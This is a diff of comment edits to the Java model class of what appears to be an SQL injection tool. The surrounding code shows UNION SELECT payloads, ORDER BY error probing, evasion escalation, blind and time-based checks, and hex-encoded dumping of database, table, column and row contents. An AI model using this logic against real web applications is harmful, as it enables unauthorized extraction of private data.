@@ -39,7 +39,7 @@ import mvc.model.database.Table;
 import tool.StringTool;
 
 /**
- * Define the Model in charge of injection, MVC functionalities are provided by ModelObservable
+ * Model in charge of injection, MVC functionalities are provided by ModelObservable
  */
 public class InjectionModel extends ModelObservable { 
 
@@ -91,10 +91,10 @@ firstSuccessPageSource,
 	public int securitySteps = 0;	// Current evasion degree, 0 is 'no evasion'
 
 	/**
-	 * Prepares the injection process, can be interrupted by the user (via stopFlag)
+	 * Prepare the injection process, can be interrupted by the user (via stopFlag)
 	 */
 	public void inputValidation(){
-		// Erase all attributes eventually defined in a previous injection,
+		// Erase all attributes eventually defined in a previous injection
 			insertionCharacter = 
 				  visibleIndex =
 				  initialQuery =
@@ -121,7 +121,7 @@ firstSuccessPageSource,
 					 timeModel = null;
 		
 		try{
-			// Test if proxy is available and applies its parameters 
+			// Test if proxy is available then apply settings 
 			if(isProxyfied && !proxyAdress.equals("") && !proxyPort.equals("")){
 				try {
 				  	new Socket(proxyAdress, Integer.parseInt(proxyPort)).close();
@@ -133,7 +133,7 @@ firstSuccessPageSource,
 				System.setProperty("http.proxyPort", proxyPort);
 			}
 	
-			// Test the connection
+			// Test the HTTP connection
 			try {
 				this.sendMessage("*** Starting new injection\nConnection test...");
 				
@@ -187,7 +187,7 @@ firstSuccessPageSource,
 					this.useTimeBasedInjection = true;
 					new GUIThread("binary-message","Each request will ask \"Is the bit is true?\", and a true response must not exceed 5 seconds.\n").run();
 				}else{
-					// No injection possible, increase evasion degree and restart whole process
+					// No injection possible, increase evasion level and restart whole process
 					securitySteps++;
 					if(securitySteps<=2){
 						this.sendMessage("Injection not possible, testing evasion n°"+securitySteps+"...");
@@ -217,7 +217,7 @@ firstSuccessPageSource,
 			}
 			
 			this.sendMessage("Fetching informations...");
-			// Get the first informations from database
+			// Get the initial informations from database
 			this.getDBInfos();
 			
 			// Stop injection if database is too old
@@ -240,7 +240,7 @@ firstSuccessPageSource,
 	}
 	
 	/**
-	 * That Runnable class defines the insertionCharacter that will be used by all futures requests,
+	 * Runnable class, define insertionCharacter that will be used by all futures requests,
 	 * i.e -1 in "[...].php?id=-1 union select[...]", sometimes it's -1, 0', 0, etc,
 	 * this class/function tries to find the working one by searching a special error message
 	 * in the source page
@@ -258,8 +258,8 @@ firstSuccessPageSource,
 			// Is the query string well formed?
 			}else if( model.method.equals("GET") && model.getData.matches("[^\\w]*=.*") ){
 				throw new PreparationException("Bad query string for injection");
-			// Extract the query information: first, everything before the sign '=', 
-			// second, the rest
+			// Parse query information: url=>everything before the sign '=', 
+			// start of query string=>everything after '='
 			}else if( model.method.equals("GET") && !model.getData.matches(".*=$") ){ 
 		    	Matcher regexSearch = Pattern.compile("(.*=)(.*)").matcher(model.getData);
 				regexSearch.find();
@@ -269,8 +269,7 @@ firstSuccessPageSource,
 				}catch(IllegalStateException e){
 					throw new PreparationException("Incorrect GET format");
 				}
-			// Extract the post information: first, everything before the sign '=', 
-			// second, the rest
+			// Parse post information
 		    }else if( model.method.equals("POST") && !model.postData.matches(".*=$") ){ 
 		    	Matcher regexSearch = Pattern.compile("(.*=)(.*)").matcher(model.postData);
 				regexSearch.find();
@@ -280,8 +279,7 @@ firstSuccessPageSource,
 				}catch(IllegalStateException e){
 					throw new PreparationException("incorrect POST format");
 				}
-			// Extract the cookie information: first, everything before the sign '=', 
-			// second, the rest
+			// Parse cookie information
 		    }else if( model.method.equals("COOKIE") && !model.cookieData.matches(".*=$") ){ 
 		    	Matcher regexSearch = Pattern.compile("(.*=)(.*)").matcher(model.cookieData);
 				regexSearch.find();
@@ -291,8 +289,7 @@ firstSuccessPageSource,
 				}catch(IllegalStateException e){
 					throw new PreparationException("incorrect Cookie format");
 				}
-			// Extract the header information: first, everything before the sign ':', 
-			// second, the rest
+			// Parse header information
 		    }else if( model.method.equals("HEADER") && !model.headerData.matches(".*:$") ){ 
 		    	Matcher regexSearch = Pattern.compile("(.*:)(.*)").matcher(model.headerData);
 				regexSearch.find();
@@ -304,8 +301,8 @@ firstSuccessPageSource,
 				}
 		    }
 			
-			// We parallelize the search and let the user stops the process if wanted
-			// SQL: we force a wrong ORDER BY clause with an inexistent column, order by 1337,
+			// Parallelize the search and let the user stops the process if needed.
+			// SQL: force a wrong ORDER BY clause with an inexistent column, order by 1337,
 			// and check if a correct error message is sent back by the server:
 			// 		Unknown column '1337' in 'order clause'
 			// or   supplied argument is not a valid MySQL result resource
@@ -317,7 +314,7 @@ firstSuccessPageSource,
 	        int total=7;
 	        while(0<total){
 //	        	try { System.out.println("Stoppable_getInsertionCharacter"); Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); }
-	        	// Break the loop if the user wants
+	        	// The user need to stop the job
 	        	if(isPreparationStopped()) throw new StoppableException();
 	        	try {
 					MyCallable currentCallable = taskCompletionService.take().get();
@@ -340,8 +337,8 @@ firstSuccessPageSource,
 	}
 
 	/**
-	 * That Runnable class searches the correct number of fields in the SQL query,
-	 * parallelizes the search, provides the stop capability
+	 * Runnable class, search the correct number of fields in the SQL query.
+	 * Parallelizes the search, provides the stop capability
 	 */
 	private class Stoppable_getInitialQuery extends Stoppable{
 		public Stoppable_getInitialQuery(InjectionModel model) {
@@ -350,7 +347,7 @@ firstSuccessPageSource,
 		
 		@Override
 		public String action(Object... args) throws PreparationException, StoppableException {
-			// We parallelize the search
+			// Parallelize the search
 			ExecutorService taskExecutor = Executors.newCachedThreadPool();
 	        CompletionService<MyCallable> taskCompletionService = new ExecutorCompletionService<MyCallable>(taskExecutor);
 
@@ -359,27 +356,27 @@ firstSuccessPageSource,
 			int selectIndex;
 			
 			// SQL: each field is built has the following 1337[index]7330+1
-			// We will search if the source contains 1337[index]7331, that notation allows to exclude
-			// pages that display our own url as a correct mark
+			// Search if the source contains 1337[index]7331, this notation allows to exclude
+			// pages that display our own url in the source
 	        for(selectIndex=1, selectFields="133717330%2b1"; selectIndex<=10 ;selectIndex++, selectFields += ",1337"+selectIndex+"7330%2b1")
 	        	taskCompletionService.submit(new MyCallable(insertionCharacter + "+union+select+" + selectFields + "--+"));
 	        	
 	        int total=10;
 	        
 			try {
-				// Starting with 10 requests, to 100
+				// Starting up with 10 requests, loop until 100
 				while( !requestFound && total<99 ){
 //					try { System.out.println("Stoppable_getInitialQuery " + selectIndex); Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); }
-					// Breaks the loop if the user wants
+					// Breaks the loop if the user needs
 					if(isPreparationStopped()) throw new StoppableException();
 	
 					MyCallable currentCallable = taskCompletionService.take().get();
-		        	// We found a corresponding mark
+		        	// Found a correct mark 1337[index]7331 in the source
 					if(Pattern.compile(".*1337\\d+7331.*", Pattern.DOTALL).matcher(currentCallable.content).matches()){
 		        		model.firstSuccessPageSource = currentCallable.content;
 		        		initialQuery = currentCallable.url.replaceAll("0%2b1","1");
 		        		requestFound = true;
-		        	// Else we add a new index
+		        	// Else add a new index
 					}else{
 		        		selectIndex++;
 		        		selectFields += ",1337"+selectIndex+"7330%2b1";
@@ -402,12 +399,12 @@ firstSuccessPageSource,
 	}
 
 	/**
-	 * That Runnable class searches the most efficient index,
-	 * some index will display lots of characters, others won't, so we sort them 
-	 * by order of efficiency: which one display the most characters?
+	 * Runnable class, search the most efficient index.
+	 * Some indexes will display a lots of characters, others won't, so sort them 
+	 * by order of efficiency: find the one that display the most of characters
 	 */	
 	private String getVisibleIndex(String firstSuccessPageSource) {		
-		// List all found index
+		// Parse all indexes found
 		Matcher regexSearch = Pattern.compile("1337(\\d+?)7331", Pattern.DOTALL).matcher(firstSuccessPageSource);
 		ArrayList<String> foundIndexes = new ArrayList<String>(); 
 		while(regexSearch.find()) 
@@ -423,7 +420,7 @@ firstSuccessPageSource,
 		// Replace correct indexes from 1337[index]7331 to 
 		//     (select concat('SQLi',[index],repeat('#',1024),'iLQS'))
 		// ==> SQLi[index]######...######iLQS
-		// We will search which index displays the most #
+		// Search for index that displays the most #
 		String performanceQuery = 
 				this.initialQuery.replaceAll(
 					"1337("+ StringTool.join(indexes,"|") +")7331",
@@ -434,7 +431,7 @@ firstSuccessPageSource,
 		
 		// Build a 2D array of string with:
 		//     column 1: index
-		// 	   column 2: corresponding # found, so #######...#######
+		// 	   column 2: # found, so #######...#######
 		regexSearch = Pattern.compile("SQLi(\\d+)(#*)", Pattern.DOTALL).matcher(performanceSourcePage);
 		ArrayList<String[]> performanceResults = new ArrayList<String[]>();
 		while(regexSearch.find()) 
@@ -461,7 +458,7 @@ firstSuccessPageSource,
 		    }
 		});
 	
-		// Replace all other index to 1
+		// Replace all others indexes by 1
 		this.initialQuery = 
 				this.initialQuery.replaceAll(
 					"1337(?!"+ lengthFields[lengthFields.length-1][1] +"7331)\\d*7331",
@@ -471,7 +468,7 @@ firstSuccessPageSource,
 	}
 
 	/**
-	 * Build a simple error based query, and verify if successful
+	 * Build a simple error based query, and verify if successful.
 	 * Check a lot of locale strings
 	 */
 	private boolean isErrorBasedInjectable() {		
@@ -513,7 +510,7 @@ firstSuccessPageSource,
 	}
 
 	/**
-	 * Test if blind works, can be stopped
+	 * Test if blind works, can be stopped.
 	 * @return true if blind works
 	 */
 	private boolean isBlindInjectable() throws PreparationException {
@@ -522,16 +519,16 @@ firstSuccessPageSource,
 	}
 
 	/**
-	 * Test if time based works, can be stopped
+	 * Test if time based works, can be stopped.
 	 * @return true if time works
 	 */
 	private boolean isTimeBasedInjectable() throws PreparationException {
-		timeModel = new TimeInjection(this, this.initialUrl+this.getData+this.insertionCharacter);
+		timeModel = new TimeInjection(this);
 		return timeModel.isTimeInjectable();
 	}
 
 	/**
-	 * Get the first database informations
+	 * Get the initial database informations
 	 * => version{%}database{%}user{%}CURRENT_USER
 	 */
 	private void getDBInfos() throws PreparationException, StoppableException {		
@@ -571,11 +568,11 @@ firstSuccessPageSource,
 	}
 
 	/**
-	 * Get all databases names and table count, then address them to the view
-	 * We use a hexadecimal format and parse the pattern
+	 * Get all databases names and table counts, then address them to the view
+	 * We use a hexadecimal format and parse the pattern:
 	 * => hh[database name 1]jj[number of tables]hhgghh[database name 2]jj[number of tables]hhggh...hi
 	 * We can't expect that all the data will be found in one request, Stoppable_loopIntoResults helps to obtain
-	 * the rest of the unreachable data,
+	 * the rest of the normally unreachable data,
 	 * The process can be stopped by the user
 	 */
 	private void listDatabases() throws PreparationException, StoppableException {		
@@ -608,7 +605,7 @@ firstSuccessPageSource,
 			null
 		);
 		
-		// Parse all the data we have retrieve
+		// Parse all data we have retrieved
 		Matcher regexSearch = Pattern.compile("hh([0-9A-F]*)jj([0-9A-F]*)(c)?hh", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(hexResult);
 		
 		if(!regexSearch.find()){
@@ -632,8 +629,8 @@ firstSuccessPageSource,
 	}
 
 	/**
-	 * Get all tables names and row count, then address them to the view
-	 * We use a hexadecimal format and parse the pattern
+	 * Get all tables names and row counts, then address them to the view
+	 * We use a hexadecimal format and parse the pattern:
 	 * => hh[table name 1]jj[number of rows]hhgghh[table name 2]jj[number of rows]hhggh...hi
 	 * We can't expect that all the data will be found in one request, Stoppable_loopIntoResults helps to obtain
 	 * the rest of the unreachable data,
@@ -677,7 +674,7 @@ firstSuccessPageSource,
 			database
 		);
 	    
-		// Parse all the data we have retrieve
+		// Parse all the data we have retrieved
 		Matcher regexSearch = 
 				Pattern.compile("hh([0-9A-F]*)jj([0-9A-F]*)(c)?hh", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(hexResult);
 		
@@ -706,7 +703,7 @@ firstSuccessPageSource,
 	
 	/**
 	 * Get all columns names (we force count to 1, then ignore it), then address them to the view
-	 * We use a hexadecimal format and parse the pattern
+	 * We use a hexadecimal format and parse the pattern:
 	 * => hh[column name 1]jj31hhgghh[column name 2]jj31hhggh...hi
 	 * We can't expect that all the data will be found in one request, Stoppable_loopIntoResults helps to obtain
 	 * the rest of the unreachable data,
@@ -748,7 +745,7 @@ firstSuccessPageSource,
 			table
 		);
 	
-		// Parse all the data we have retrieve
+		// Parse all the data we have retrieved
 		Matcher regexSearch = Pattern.compile("hh([0-9A-F]*)jj([0-9A-F]*)(c)?hh", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(hexResult);
 		
 		if(!regexSearch.find()){
@@ -794,7 +791,7 @@ firstSuccessPageSource,
 		for(ElementDatabase e: argsElementDatabase)
 			columnsName.add(e+"");
 		
-	    // From that array, format the SQL fields nicely
+	    // From that array, build the SQL fields nicely
 		// =>  col1{%}col2...
 		// ==> trim(ifnull(`col1`,0x00)),0x7f,trim(ifnull(`Col2`,0x00))...
 		String[] arrayColumns = columnsName.toArray(new String[columnsName.size()]);
@@ -859,7 +856,7 @@ firstSuccessPageSource,
 		
 //    	System.out.println( "# Results: "+ duplicates +" duplicates, "+ rowsFound +" distinct values, " /*+ (rowCount-rowsFound-duplicates) +" unreachables duplicates, "*/ + cutted + " rows truncated\n");
 
-		// Add the default title to the columns 
+		// Add the default title to the columns: row number, occurrence
         columnsName.add(0,"nbRow");
         columnsName.add(0,"#");
         
@@ -891,7 +888,7 @@ firstSuccessPageSource,
 
 	/**
 	 * Get all data from a SQL request (remember that data will often been cut, we need to reach ALL the data)
-	 * We expect the following well formed line
+	 * We expect the following well formed line:
 	 * => hh[0-9A-F]*jj[0-9A-F]*c?hhgghh[0-9A-F]*jj[0-9A-F]*c?hhg...hi
 	 * We must check if that long line is cut, and where it is cut, basically we will move our position in a virtual 2D array,
 	 * and use LIMIT and MID to move the cursor ; LIMIT skips whole line (useful if result contains 1 or more complete row) ; and 
@@ -917,9 +914,9 @@ firstSuccessPageSource,
 			String sqlQuery = new String(initialSQLQuery).replaceAll("\\{limit\\}","");
 			
 			/**
-			 * We know the number of rows expected (numberToFind) and stop injection if all rows are found, 
-			 * we keep track of rows we have reached (limitSQLResult) and use these to skip entire rows,
-			 * we keep track of characters we have reached (startPosition) and use these to skip characters,
+			 * As we know the expected number of rows (numberToFind), then it stops injection if all rows are found, 
+			 * keep track of rows we have reached (limitSQLResult) and use these to skip entire rows,
+			 * keep track of characters we have reached (startPosition) and use these to skip characters,
 			 */
 			String finalResultSource = "", currentResultSource = "";
 			for(int limitSQLResult=0, startPosition=1, i=1;/* 3 */;startPosition = currentResultSource.length()+1, i++){
@@ -1003,7 +1000,7 @@ firstSuccessPageSource,
 				if(!regexSearch.find()){
 					if( useLimit && !finalResultSource.equals("") ){
 //						model.sendMessage("A");
-						// Update the view only if there are value to find, and if not the root (empty tree)
+						// Update the view only if there are value to find, and if it's not the root (empty tree)
 						if(numberToFind>0 && searchName != null)
 							new GUIThread("update-progressbar", new Object[]{searchName,numberToFind}).run();
 						break;
@@ -1011,15 +1008,14 @@ firstSuccessPageSource,
 				}
 				
 				/**
-				 * Add the result to the data already found
-				 * Informs the view about it
+				 * Add the result to the data already found, informs the view about it
 				 * If throws exception, inform the view about the failure
 				 */
 				try{
 					currentResultSource += regexSearch.group(1);
 					new GUIThread("logs-message",regexSearch.group(1)+" ").run();
 				}catch(IllegalStateException e){
-					if(searchName != null){ // si différent d'une recherche de database
+					if(searchName != null){ // if it's not the root (empty tree)
 						new GUIThread("end-progress", searchName).run();
 					}
 					throw new PreparationException("Fetching fails: no data to parse for "+searchName);
@@ -1071,7 +1067,7 @@ firstSuccessPageSource,
 						Matcher regexSearch2=Pattern.compile("h[0-9A-F]+$", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(currentResultSource);
 						
 						/**
-						 * If there is more than 1 row, delete the last incomplete one
+						 * If there is more than 1 row, delete the last incomplete one in order to restart properly from it at the next loop,
 						 * else if there is 1 row but incomplete, mark it as cut with the letter c
 						 */
 						if(regexSearch.find()){
@@ -1098,7 +1094,7 @@ firstSuccessPageSource,
 							new GUIThread("update-progressbar", new Object[]{searchName,limitSQLResult}).run();
 	
 						/**
-						 * Ending condition: every expected rows have been retrieved
+						 * Ending condition: every expected rows have been retrieved.
 						 * Inform the view about the progression
 						 */
 						if( limitSQLResult == numberToFind ){ 
@@ -1109,7 +1105,7 @@ firstSuccessPageSource,
 						}
 						
 						/**
-						 *  Add the LIMIT statement to the next SQL query
+						 *  Add the LIMIT statement to the next SQL query and reset variables:
 						 *  Put the character cursor to the beginning of the line, and reset the result of the current query 
 						 */
 	                    sqlQuery = Pattern.compile("\\{limit\\}", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(initialSQLQuery).replaceAll("+limit+" + limitSQLResult + ",65536");
@@ -1123,7 +1119,7 @@ firstSuccessPageSource,
 						break;
 					}
 				/**
-				 * Check if the line is odd or even, make it even
+				 * Check if the line is odd or even, make it even (every character must be on 2 char, e.g A is 41, if we only have 4, then delete the 4)
 				 * #Need verification
 				 */
 				}else if(currentResultSource.length() % 2 == 0){
@@ -1149,7 +1145,7 @@ firstSuccessPageSource,
 	    HttpURLConnection connection = null;
 		URL urlObject = null;
 
-		// Temporary url, we go from "select 1,2,3,4..." to "select 1,([complex query]),2..." 
+		// Temporary url, we go from "select 1,2,3,4..." to "select 1,([complex query]),2...", but keep initial url
 		String urlUltimate = this.initialUrl;
 		dataInjection = dataInjection.replace("\\", "\\\\"); // escape crazy characters, like \ 
 		
@@ -1254,7 +1250,7 @@ firstSuccessPageSource,
 		}
 		
 		/**
-		 * Add informations and header response to the logs 
+		 * Add info and header response to the logs 
 		 */
 	    logs += urlUltimate+"\n";
 	    for (int i=0; ;i++) {
@@ -1280,7 +1276,7 @@ firstSuccessPageSource,
 			this.sendErrorMessage(e.getMessage()); /* lot of timeout in local use */
 		}
 		
-		// return the web source code
+		// return the source code of the page
 		return pageSource;
 	}
 	
